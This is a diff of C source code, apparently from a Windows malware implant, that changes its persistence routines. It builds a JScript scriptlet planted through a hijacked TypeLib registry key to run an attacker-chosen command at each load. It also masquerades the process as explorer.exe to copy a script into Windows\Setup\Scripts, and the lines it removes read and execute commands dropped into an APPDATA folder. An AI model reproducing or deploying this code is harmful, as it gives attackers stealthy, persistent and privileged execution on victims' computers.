@@ -170,7 +170,8 @@ CLEANUP:
 
 BOOL PersistenceMethod2
 (
-	_In_ LPSTR lpCommandLine
+	_In_ LPSTR lpCommandLine,
+	_In_ PGLOBAL_CONFIG pConfig
 )
 {
 	CHAR szTypeLibPath[] = "SOFTWARE\\Classes\\TypeLib\\{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}";
@@ -186,6 +187,7 @@ BOOL PersistenceMethod2
 	LPSTR lpDefaultValue = NULL;
 	LPWSTR lpTempPath = NULL;
 	LPSTR lpReformatedCommand = NULL;
+	LPSTR lpReformatedPath = NULL;
 	DWORD dwLastError = ERROR_SUCCESS;
 
 	Status = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\TypeLib", 0, KEY_WRITE, &hKey);
@@ -212,23 +214,19 @@ BOOL PersistenceMethod2
 		goto CLEANUP;
 	}
 
-	lpSctPath = ALLOC(MAX_PATH);
-	ExpandEnvironmentStringsA("%APPDATA%\\com.logi", lpSctPath, MAX_PATH);
-	if (!CreateDirectoryA(lpSctPath, NULL)) {
-		dwLastError = GetLastError();
-		if (dwLastError != ERROR_ALREADY_EXISTS) {
-			LOG_ERROR("CreateDirectoryA", dwLastError);
-			goto CLEANUP;
-		}
-	}
-
 	lpReformatedCommand = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
 	if (lpReformatedCommand == NULL) {
 		goto CLEANUP;
 	}
 
-	lstrcatA(lpSctPath, "\\log.sct");
-	lpSctContent = DuplicateStrA("<?xml version=\"1.0\"?>\n<scriptlet>\n    <registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\">\n    </registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\");\n            var fso = new ActiveXObject(\"Scripting.FileSystemObject\");\n            var logiPath = WShell.ExpandEnvironmentStrings(\"%APPDATA%\\\\com.logi\")\n            if (fso.FolderExists(logiPath)) {\n                var folder = fso.GetFolder(logiPath)\n                var files = folder.Files\n                var runCmd = false\n                for(var objEnum = new Enumerator(files); !objEnum.atEnd(); objEnum.moveNext()) {\n                    item = objEnum.item();\n                    var fullName = logiPath + \"\\\\\" + item.Name\n                    if (item.Name.search(\".in\") != -1) {\n                        runCmd = true\n                        var reader = fso.OpenTextFile(fullName, 1, true, 0)\n                        command = reader.ReadLine()\n                        reader.Close()\n                        fso.DeleteFile(fullName)\n                        WShell.Run(command)\n                    }\n                }\n\n                if (!runCmd) {\n                    WShell.Run(\"", 0);
+	lpSctPath = ALLOC(MAX_PATH);
+	lpSctPath = ConvertWcharToChar(pConfig->lpScriptPath);
+	lpReformatedPath = StrReplaceA(lpSctPath, "\\", "\\\\", TRUE, 0);
+	lpSctPath = StrCatExA(lpSctPath, "\\log.sct");
+
+	lpSctContent = DuplicateStrA("<?xml version=\"1.0\"?>\n<scriptlet>\n    <registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\">\n    </registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\")\n            var fso = new ActiveXObject(\"Scripting.FileSystemObject\")\n            var logiPath = WShell.ExpandEnvironmentStrings(\"", 0);
+	lpSctContent = StrCatExA(lpSctContent, lpReformatedPath);
+	lpSctContent = StrCatExA(lpSctContent, "\")\n            if (fso.FolderExists(logiPath)) {\n                var folder = fso.GetFolder(logiPath)\n                var files = folder.Files\n                var run = true\n                for(var objEnum = new Enumerator(files); !objEnum.atEnd(); objEnum.moveNext()) {\n                    item = objEnum.item();\n                    if (item.Name.search(\".txt\") != -1) {\n                        fullName = logiPath + \"\\\\\" + item.Name\n                        try {\n                            var reader = fso.OpenTextFile(fullName, 1, true, 0)\n                        }\n                        catch (err) {\n                            run = false\n                            break\n                        }\n                    }\n                }\n\n                if (run) {\n                    WShell.Run(\"");
 	lpSctContent = StrCatExA(lpSctContent, lpReformatedCommand);
 	lpSctContent = StrCatExA(lpSctContent, "\")\n                }\n            }\n        ]]>\n    </script>\n</scriptlet>");
 	lpTempPath = ConvertCharToWchar(lpSctPath);
@@ -268,25 +266,12 @@ CLEANUP:
 		RegCloseKey(hWin32);
 	}
 
-	if (lpSctPath != NULL) {
-		FREE(lpSctPath);
-	}
-
-	if (lpTempPath != NULL) {
-		FREE(lpTempPath);
-	}
-
-	if (lpDefaultValue != NULL) {
-		FREE(lpDefaultValue);
-	}
-
-	if (lpSctContent != NULL) {
-		FREE(lpSctContent);
-	}
-
-	if (lpReformatedCommand != NULL) {
-		FREE(lpReformatedCommand);
-	}
+	FREE(lpSctPath);
+	FREE(lpTempPath);
+	FREE(lpDefaultValue);
+	FREE(lpSctContent);
+	FREE(lpReformatedCommand);
+	FREE(lpReformatedPath);
 
 	return Result;
 }
@@ -305,6 +290,8 @@ BOOL PersistenceMethod1
 	WCHAR wszNullStr[0x10];
 	BOOL RestoreProcessPath = FALSE;
 
+	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
+	SecureZeroMemory(OldPath, sizeof(OldPath));
 	GenerateTempPathW(L"ErrorHandler.cmd", NULL, NULL, &lpTempPath);
 	GetWindowsDirectoryW(wszWindowsPath, _countof(wszWindowsPath));
 	lstrcatW(wszWindowsPath, L"\\Setup\\Scripts");
@@ -313,10 +300,8 @@ BOOL PersistenceMethod1
 	}
 
 	CreateTempFile = TRUE;
-	SecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
 	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
 	lstrcatW(wszExplorerPath, L"\\explorer.exe");
-	SecureZeroMemory(OldPath, sizeof(OldPath));
 	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
 	RestoreProcessPath = TRUE;
 	if (!MasqueradedMoveCopyDirectoryFileCOM(lpTempPath, wszWindowsPath, FALSE)) {
